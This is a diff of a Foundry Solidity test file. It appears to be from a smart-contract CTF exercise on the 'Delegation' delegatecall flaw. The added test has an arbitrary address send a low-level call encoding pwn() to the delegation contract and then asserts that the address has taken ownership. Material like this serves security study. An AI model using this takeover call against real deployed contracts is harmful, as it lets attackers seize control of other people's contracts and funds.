@@ -47,16 +47,37 @@ contract DelegateTest is Test {
 
         assertEq(delegation.owner(), DelegateContractOwner);
 
+
+        // Attack
         vm.startPrank(AttackerOwner);
         attacker.attack();
         vm.stopPrank();
         
-        // After Attack The Attackeer Contract Should be The Owner
+        // After Attack The Attacker Contract Should be The Owner of Delefation Contract
         assertEq(delegation.owner(), address(attacker));
 
+    }
+
+    function test_EvenAnyExternalEOACanAttack() public {
+
+        address user = makeAddr("user");
+        // Before Attack
+        assertEq(delegation.owner(), DelegateContractOwner);
+
+        // Attack
+        vm.startPrank(user);
+        address(delegation).call{value : 0 ether}( // `{value : 0 ether}` is not neccessary without this it can be done also   
+            abi.encodeWithSignature("pwn()")
+        );
+        vm.stopPrank();
+
+        // After Attack The user  Should be The Owner of Delefation Contract.
+
+        assertEq(delegation.owner(), address(user));
 
 
-        
+
+
     }
 
 
